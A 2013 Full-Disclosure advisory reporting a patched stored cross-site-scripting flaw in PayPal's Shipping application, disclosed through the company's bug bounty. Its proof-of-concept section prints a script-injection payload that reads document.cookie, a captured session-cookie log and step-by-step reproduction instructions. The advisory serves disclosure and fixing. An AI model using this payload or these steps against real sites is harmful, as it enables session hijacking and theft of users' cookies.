
Date: Sat, 26 Oct 2013 04:11:10 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Paypal Inc Bug Bounty #104 - Persistent Exception
	Vulnerability

Document Title:
===============
Paypal Inc Bug Bounty #104 - Persistent Exception Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1038

PayPal Security UID: gJ1127yy


Release Date:
=============
2013-10-26


Vulnerability Laboratory ID (VL-ID):
====================================
1038


Common Vulnerability Scoring System:
====================================
4.3


Product & Service Introduction:
===============================
PayPal is a global e-commerce business allowing payments and money transfers to be made through the Internet. Online money 
transfers serve as electronic alternatives to paying with traditional paper methods, such as checks and money orders. Originally, 
a PayPal account could be funded with an electronic debit from a bank account or by a credit card at the payer s choice. But some 
time in 2010 or early 2011, PayPal began to require a verified bank account after the account holder exceeded a predetermined 
spending limit. After that point, PayPal will attempt to take funds for a purchase from funding sources according to a specified 
funding hierarchy. If you set one of the funding sources as Primary, it will default to that, within that level of the hierarchy 
(for example, if your credit card ending in 4567 is set as the Primary over 1234, it will still attempt to pay money out of your 
PayPal balance, before it attempts to charge your credit card). The funding hierarchy is a balance in the PayPal account; a 
PayPal credit account, PayPal Extras, PayPal SmartConnect, PayPal Extras Master Card or Bill Me Later (if selected as primary 
funding source) (It can bypass the Balance); a verified bank account; other funding sources, such as non-PayPal credit cards.
The recipient of a PayPal transfer can either request a check from PayPal, establish their own PayPal deposit account or request 
a transfer to their bank account.

PayPal is an acquirer, performing payment processing for online vendors, auction sites, and other commercial users, for which it 
charges a fee. It may also charge a fee for receiving money, proportional to the amount received. The fees depend on the currency 
used, the payment option used, the country of the sender, the country of the recipient, the amount sent and the recipient s account 
type. In addition, eBay purchases made by credit card through PayPal may incur extra fees if the buyer and seller use different currencies.

On October 3, 2002, PayPal became a wholly owned subsidiary of eBay. Its corporate headquarters are in San Jose, California, United 
States at eBay s North First Street satellite office campus. The company also has significant operations in Omaha, Nebraska, Scottsdale, 
Arizona, and Austin, Texas, in the United States, Chennai, Dublin, Kleinmachnow (near Berlin) and Tel Aviv. As of July 2007, across 
Europe, PayPal also operates as a Luxembourg-based bank.

On March 17, 2010, PayPal entered into an agreement with China UnionPay (CUP), China s bankcard association, to allow Chinese consumers 
to use PayPal to shop online.PayPal is planning to expand its workforce in Asia to 2,000 by the end of the year 2010.
Between December 4ñ9, 2010, PayPal services were attacked in a series of denial-of-service attacks organized by Anonymous in retaliation 
for PayPal s decision to freeze the account of WikiLeaks citing terms of use violations over the publication of leaked US diplomatic cables.

(Copy of the Homepage: www.paypal.com) [http://en.wikipedia.org/wiki/PayPal]


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered a persistent input validation vulnerability  in the official PayPal Inc (Core & API) Shipping Application.


Vulnerability Disclosure Timeline:
==================================
2013-07-31:	Researcher Notification & Coordination (Benjamin Kunz Mejri)
2013-08-01:	Vendor Notification (PayPal Site Security Team - Bug Bounty Program)
2013-09-26:	Vendor Response/Feedback (PayPal Site Security Team - Bug Bounty Program)
2013-10-25:	Vendor Fix/Patch (PayPal Site Developer Team)
2013-10-26:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
PayPal Inc
Product: Shipping & MOS Application - API 2013 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A persistent input validation web vulnerability is detected in the official PayPal Inc (Core & API) Shipping Web Application.
The vulnerability allows remote attacker to inject own malicious script codes to the application-side with persistent attack vector. 

The vulnerability is located in the service unavailable exception of the Get Started with paypal module. Remote attackers can request 
the Get Started service with an invalid response to display the service unavailable exception. After the provoke of the exception-handling 
it is possible to execute the malicious context without secure encode. The remote attacker is able to inject script code to the pickup address.
The server save the input and validate it. The result is an internal server error when processing to request via POST method. The response of 
the internal server error exception displays the value of the stored input as output in the error. The remote attacker can inject the malicious 
own script code in the Scheduling a Carrier Pickup module.

Exploitation of the persistent web vulnerability requires a low privilege web application user account and low user interaction. 
Successful exploitation of the vulnerability results in session hijacking, persistent phishing, persistent external redirects, 
persistent load of malicous script codes or persistent web module context manipulation.


Vulnerable Service(s):
				[+] Paypal Inc - Shipping Application (Core & API) 

Vulnerable Module(s):
				[+] Get Started

Vulnerable Parameter(s):
				[+] UnavailableAddress

Affected Module(s):
				[+] Get Started Listing - Service Unavailable (Exception)


Proof of Concept (PoC):
=======================
The persistent input validation web vulnerability can be exploited by remote attackers with low privilege web application user account 
and low user interaction. For demonstration or reproduce ...


--- Exception Log ---
Service unavailable:
PayPal MultiOrder Shipping has experienced an Internal Error. CAL: caa2b9a811b2f 
PayPal MultiOrder Shipping is currently unavailable ...

Pickup Address:
"/>a%20/>"> a%20/>">
alsfkjlan

a%20/>">
alsfkjlan

Galveston"/>, TX 77550
5305352131


-- Module Text Log ---
Carrier Pickup™
Scheduling a Carrier Pickup™ is simple and can be made in the MultiOrder Shipping tool from your Ship From 
Address free of charge, regardless of the number of packages you’re sending. Your carrier will pick up your 
package by arranging a date and time with you, most likely when your mail is delivered. A US Postal Service 
carrier will validate your pickup.

--- Vulnerable Modules ---
Carrier Pickup™ Rules > Carrier Pickup™ > Schedule > Details Box (Right)
Schedule > Schedule a Shipment pickup


PoC: Exception Handling - Service UnavailableAddress

<table>
<tbody><tr>
<td valign="top" width="30"><img src="pickup_data/error.gif"></td>
<td><strong>Service unavailable:</strong>
<br>
<div id="UnvailableErrorMsg">PayPal MultiOrder Shipping has 
experienced an Internal Error.  CAL: a8348eaee9327 PayPal MultiOrder 
Shipping is currently unavailable</div>
<br>
<strong>Pickup Address:</strong><br>
<span id="UnavailableAddress">"/>a%20/>"><img src="pickup_data/t.htm" onerror="prompt(document.cookie)">  
a%20/>"><h1>alsfkjlan</h1><br>a%20/>"><h1>alsfkjlan</h1><br>Galveston"/>, TX 77550<br>5305352131</span>
</td>
</tr>
</tbody></table>


--- Session Cookie Log ---
s_sess=%20c_m%3DNatural%2520Searchshipping%2520paypalwww.google.de%3B%20lt%3D%3B%20s_cc%3Dtrue%3B%20v
31%3Dxpt%252FShipping%252Fshipping%252FLanding%253A%253A_flow%3B%20s_ppv%3D0%3B%20tr_p1%3Dxpt%252Fshipping%252F
shipping%252Flanding%253A%253A_flow%257E%255B1%255D%3B%20 s_sq%3D%3B; s_pers=%20s_fid%3D433059AB3DFCB070-
2C9DD2F273DE8BD3%7C1438355061269%3B%20gpv_c43%3Dxpt
%252Fshipping%252Fshipping%252Flanding%253A%253A_flow%7C13
75284861272%3B%20gpv_events%3Dno%2520value%7C1375284861281%3B; 
ts=vreXpYrS%3D1469953845%26vteXpYrS%3D1375284868%26vr%3D351933681400a491c537afa7fffe52b3%26vt
%3D3541a4ca1400a4a1e4f0f020fffccc3f;aksession=1375283328~id=cookiedZpXvTYP/vxObCwSbHlZoBfLMoiYM3wXtk8Eo5u8xlJFZAKRSGA
+js64v6V6Ovu7xuwPKwDcBozAV5iTbiYkk5fgTSW0+nL47JyBxQfSS6FCb363d2PeTOZPOMC4Agp0vCYxSAjEtuU=; 
Apache=10.74.8.163.1375283067831826


Manual steps to reproduce the persistent remote vulnerability ...

1. Register a paypal.com account
2. Activate the shipping module (eu users only) < we used  Current View: USPS United States
3. Login to you account and go to the shipping module
4. Open the account settings in the shipping application and include as Pickup Address the own poc as payload with non-malicious script code
Note: The input must be send with invalid values character like ' -: ." to let an exception popup at the end.
5. Save the data and go to the shipping application
6. We shortly log out and login again with the same user account for proof
7. Now a box popup (Get Started) when the user is processing to login > click Schedule > Schedule Pickup Carrier
8. The USPS Carrier Pickup opens and executes the injected script code (payload) as persistent bug
Note: The module displays the not secure parsed/encoded input of the pickup address in the UnavailableAddres exception-handling module.
9. Successful reproduced!
Note: Even if the context of the request is invalid the data will be stored and visible in the details and profile after usage.



Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of the pickupadress input fields.
To fix the second bug parse the UnavailableAddress  (output) value in the exception-handling.


Security Risk:
==============
The security risk of the persistent input validation and exception-handling vulnerability is estimated as medium(+).


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@...lution-sec.com)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       - admin@...lution-sec.com
Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2013 | Vulnerability Laboratory [Evolution Security]



-- 
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/